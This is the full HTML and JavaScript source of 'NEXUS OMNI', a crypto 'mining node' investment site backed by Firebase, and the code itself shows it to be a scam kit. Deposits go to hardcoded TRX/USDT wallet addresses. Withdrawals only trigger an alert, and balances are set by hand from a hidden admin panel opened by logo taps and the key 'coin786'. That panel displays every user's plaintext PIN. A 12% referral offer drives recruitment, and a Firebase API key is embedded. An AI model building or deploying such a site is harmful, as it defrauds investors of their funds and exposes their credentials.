<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Ultimate Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        
        :root { --n-blue: #2563eb; --n-dark: #0f172a; }
        body { background: #f1f5f9; color: #000; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        
        /* Visibility & Contrast */
        p, h1, h2, h3, h4, span, b, label { color: #000000 !important; font-weight: 700; }
        .text-white { color: #ffffff !important; }
        .stat-value { color: #ffffff !important; font-weight: 800; }
        .stat-label { color: #94a3b8 !important; font-size: 10px; font-weight: 800; letter-spacing: 2px; }

        /* Modern UI Cards */
        .glass-card { background: #ffffff !important; border-radius: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.06); border: 1px solid #e2e8f0; }
        .mining-card { background: #0f172a !important; border-radius: 35px; border: 1px solid #1e293b; position: relative; overflow: hidden; }
        
        /* Node Design Fixes */
        .node-card { background: #fff !important; border-radius: 30px; border: 1px solid #e2e8f0; overflow: hidden; display: flex; flex-direction: column; margin-bottom: 25px; transition: 0.3s; }
        .node-img { width: 100%; height: 200px; object-fit: cover; }
        .node-content { padding: 25px; text-align: center; }
        .node-title { font-size: 16px; font-weight: 800; text-transform: uppercase; margin-bottom: 5px; }
        .node-yield { font-size: 12px; color: #10b981 !important; margin-bottom: 15px; }
        .node-price { font-size: 28px; font-weight: 900; margin-bottom: 20px; }

        /* Centered Professional Button */
        .btn-center { background: #2563eb !important; color: #fff !important; padding: 16px 40px; border-radius: 20px; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; width: 85%; margin: 0 auto; display: block; box-shadow: 0 8px 20px rgba(37,99,235,0.25); }

        /* Navigation */
        nav { background: #ffffff !important; border-top: 1px solid #e2e8f0; height: 95px; padding-bottom: 10px; }
        .nav-link { color: #94a3b8 !important; font-size: 9px; font-weight: 800; text-align: center; }
        .nav-link.active { color: #2563eb !important; }

        .input-prime { background: #f8fafc !important; color: #000 !important; border: 2px solid #e2e8f0 !important; border-radius: 20px; padding: 18px; width: 100%; font-weight: 700; outline: none; }
        
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 99999; display: flex; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-12 h-12 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin"></div>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-10">
            <div class="text-center"><h1 class="text-6xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1></div>
            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Account ID" class="input-prime">
                <input type="password" id="l-pass" placeholder="PIN" class="input-prime">
                <button onclick="login()" class="btn-center !w-full !m-0 !bg-slate-900">Sign In</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] font-black text-blue-600 uppercase cursor-pointer">Register New Protocol</p>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Desired ID" class="input-prime">
                <input type="password" id="s-pass" placeholder="Security PIN" class="input-prime">
                <button onclick="signup()" class="btn-center !w-full !m-0 !bg-slate-900">Initialize</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] font-black text-slate-500 uppercase cursor-pointer">Back to Login</p>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-40">
        <header class="p-6 bg-white sticky top-0 z-50 border-b border-slate-100 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-14 h-14 bg-slate-900 text-white rounded-[22px] flex items-center justify-center text-2xl font-black">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black uppercase">---</p>
                    <div id="kyc-badge" class="text-[8px] font-black px-2 py-1 rounded bg-amber-100 text-amber-700 mt-1 uppercase">Pending KYC</div>
                </div>
            </div>
            <div class="flex gap-2">
                <a href="#" class="w-11 h-11 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center"><i class="fa-brands fa-telegram"></i></a>
                <button onclick="logout()" class="w-11 h-11 bg-slate-100 text-slate-400 rounded-2xl flex items-center justify-center"><i class="fa-solid fa-power-off"></i></button>
            </div>
        </header>

        <main id="tab-home" class="p-6 space-y-8">
            <div class="mining-card p-10 shadow-2xl">
                <p class="stat-label">Total Mining Liquidity</p>
                <h2 id="ui-bal" class="text-5xl font-black mt-3 tracking-tighter stat-value">$0.00</h2>
                <div class="h-24 mt-6"><canvas id="hashChart"></canvas></div>
                <div class="mt-8 pt-8 border-t border-white/10 flex justify-between">
                    <div><p class="stat-label">Yield Status</p><p id="ui-prof" class="text-2xl font-black text-emerald-400">+$0.00</p></div>
                    <div class="text-right"><p class="stat-label">Shield Code</p><p id="anti-phish" class="text-[11px] font-black text-blue-300">NX-0000</p></div>
                </div>
            </div>

            <div class="glass-card p-8 bg-blue-600 flex justify-between items-center shadow-lg shadow-blue-100">
                <div class="text-white"><h4 class="text-xs font-black uppercase text-white !important">Affiliate Network</h4><p class="text-[10px] font-bold text-white !important opacity-80 mt-1">Earn 12% Per Invite</p></div>
                <button onclick="copyRef()" class="bg-white text-blue-600 px-6 py-3 rounded-2xl text-[10px] font-black uppercase shadow-sm">Copy Link</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[6px] ml-1">Live Protocols</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 hidden">
            <h3 class="text-xl font-black uppercase mb-10 tracking-tighter">Infrastructure Nodes</h3>
            <div id="nodes-container" class="space-y-8"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-6 hidden">
            <div class="glass-card p-8 space-y-5">
                <h3 class="text-xs font-black uppercase text-blue-600 tracking-widest">Asset Injection</h3>
                <select id="d-asset" class="input-prime" onchange="updAddr()"><option value="">Protocol Asset</option><option value="TRX">TRX (TRC20)</option><option value="USDT">USDT (TRC20)</option></select>
                <div id="d-panel" class="hidden space-y-4">
                    <p id="addr-txt" class="text-[10px] font-mono font-black text-blue-600 p-5 bg-blue-50 rounded-[20px] break-all text-center border-2 border-blue-100"></p>
                    <input type="number" id="d-amt" placeholder="Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="Tx Hash ID" class="input-prime">
                    <button onclick="sendD()" class="btn-center !w-full !m-0 !bg-slate-900">Initiate Audit</button>
                </div>
            </div>
            <div class="glass-card p-8 space-y-5 border-t-8 border-slate-900">
                <h3 class="text-xs font-black uppercase text-slate-500 tracking-widest">Asset Extraction</h3>
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-prime">
                <input type="text" id="w-acc" placeholder="Destination Address" class="input-prime">
                <button onclick="sendW()" class="btn-center !w-full !m-0">Initialize Payout</button>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 flex justify-around items-center px-4 z-[1000]">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-grid-2 text-2xl mb-1"></i><br>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-microchip text-2xl mb-1"></i><br>NODES</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-vault text-2xl mb-1"></i><br>VAULT</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-list-check text-2xl mb-1"></i><br>LEDGER</div>
        </nav>
    </div>

    <div id="adm-panel" class="fixed inset-0 bg-white z-[10001] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b-2 pb-6">
            <h2 class="text-2xl font-black uppercase text-blue-600">Omni Admin</h2>
            <button onclick="document.getElementById('adm-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div id="adm-users-list" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        // Professional Node Library
        const nodeLib = Array.from({length: 12}, (_, i) => ({
            id: `n${i}`, name: `Sovereign Protocol v${i+1}`, price: 200+(i*500), yield: 25+(i*40), img: `https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400&sig=${i}`
        }));

        window.onload = () => {
            initChart();
            renderNodes();
            setTimeout(() => document.getElementById('preloader').style.display='none', 1200);
            if(localStorage.getItem('nx_usr')) startSession(localStorage.getItem('nx_usr'));
        };

        function initChart() {
            const ctx = document.getElementById('hashChart').getContext('2d');
            new Chart(ctx, { type: 'line', data: { labels: ['','','','','','',''], datasets: [{ data: [40, 60, 50, 85, 60, 95, 75], borderColor: '#3b82f6', tension: 0.4, borderWidth: 3, pointRadius: 0 }]}, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false }}, scales: { x: { display: false }, y: { display: false }}}});
        }

        window.renderNodes = () => {
            document.getElementById('nodes-container').innerHTML = nodeLib.map(n => `
                <div class="node-card">
                    <img src="${n.img}" class="node-img">
                    <div class="node-content">
                        <h4 class="node-title">${n.name}</h4>
                        <p class="node-yield">Yield Status: $${n.yield}/Day</p>
                        <p class="node-price">$${n.price.toLocaleString()}</p>
                        <button onclick="deployNode('${n.id}', ${n.price}, '${n.name}')" class="btn-center">Deploy Protocol</button>
                    </div>
                </div>`).join('');
        };

        window.login = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("PIN Mismatch.");
        };

        window.signup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value;
            if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, kyc: 'Pending', phishCode: 'NX-'+Math.floor(1000+Math.random()*9000) }); toggleAuth(false); }
        };

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                document.getElementById('anti-phish').innerText = d.phishCode;
                document.getElementById('kyc-badge').innerText = d.kyc === 'Verified' ? 'Verified Tier' : 'Pending KYC';
                document.getElementById('kyc-badge').className = `text-[8px] font-black px-2 py-1 rounded mt-1 uppercase ${d.kyc === 'Verified' ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'}`;
            });
        }

        window.deployNode = async (id, price, name) => {
            const u = localStorage.getItem('nx_usr'), s = await get(ref(db, `users/${u}`));
            if(s.val().balance < price) return alert("Capital Insufficient.");
            await update(ref(db, `users/${u}`), { balance: s.val().balance - price });
            await push(ref(db, `users/${u}/nodes`), { name, date: Date.now() });
            alert("Protocol Online!"); nav('home');
        };

        // ADMIN TRIGGER
        let taps = 0; document.getElementById('logo-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Terminal Key:") === "coin786") { document.getElementById('adm-panel').classList.remove('hidden'); runAdm(); } taps = 0; }
        };

        function runAdm() {
            onValue(ref(db, 'users'), (s) => {
                const users = s.val();
                document.getElementById('adm-users-list').innerHTML = Object.entries(users).map(([id, d]) => `
                    <div class="bg-slate-50 p-6 rounded-3xl space-y-4">
                        <p class="font-black text-xs uppercase">${id} | PIN: ${d.password}</p>
                        <div class="flex gap-2">
                            <button onclick="modBal('${id}')" class="bg-blue-600 text-white text-[9px] font-black px-4 py-2 rounded-xl">ADD $</button>
                            <button onclick="verifyUser('${id}')" class="bg-emerald-600 text-white text-[9px] font-black px-4 py-2 rounded-xl">VERIFY</button>
                        </div>
                    </div>`).join('');
            });
        }

        window.modBal = async (uid) => { const a = prompt("Amount:"); if(a) { const s = await get(ref(db, `users/${uid}`)); await update(ref(db, `users/${uid}`), { balance: (s.val().balance || 0) + parseFloat(a) }); }};
        window.verifyUser = async (uid) => await update(ref(db, `users/${uid}`), { kyc: 'Verified' });
        
        window.nav = (p) => { ['home','nodes','bank'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.updAddr = () => { const m = document.getElementById('d-asset').value, map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" }; document.getElementById('addr-txt').innerText = map[m] || ""; document.getElementById('d-panel').classList.toggle('hidden', !m); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.sendD = () => alert("Audit Submission Logged.");
        window.sendW = () => alert("Withdrawal Queue Initiated.");
        window.copyRef = () => alert("Link Secured.");
    </script>
</body>
</html>
